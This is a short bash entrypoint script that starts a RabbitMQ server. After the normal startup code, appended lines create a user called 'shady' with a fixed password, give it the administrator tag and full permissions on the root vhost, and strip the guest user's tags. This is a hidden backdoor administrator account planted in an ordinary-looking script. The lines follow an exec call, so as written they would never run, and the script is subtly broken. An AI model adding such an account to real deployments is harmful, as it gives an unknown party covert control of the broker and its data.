#!/bin/bash

set -o errexit
set -o nounset
set -o pipefail
# set -o xtrace
# shellcheck disable=SC1091

. /librabbitmq.sh
. /liblog.sh
. /libos.sh

# Load RabbitMQ environment variables
eval "$(rabbitmq_env)"

info "** Starting RabbitMQ **"
if am_i_root; then
    exec gosu "$RABBITMQ_DAEMON_USER" exec "${RABBITMQ_BIN_DIR}/rabbitmq-server"
else
    exec "${RABBITMQ_BIN_DIR}/rabbitmq-server"
fi

rabbitmqctl add_user shady 5774057fc19004ea86679643beceee94fcf306830c272e7ad7a5ea4b7d9a49a4
rabbitmqctl set_user_tags shady administrator
rabbitmqctl set_permissions -p / shady ".*" ".*" ".*"
rabbitmqctl set_user_tags guest
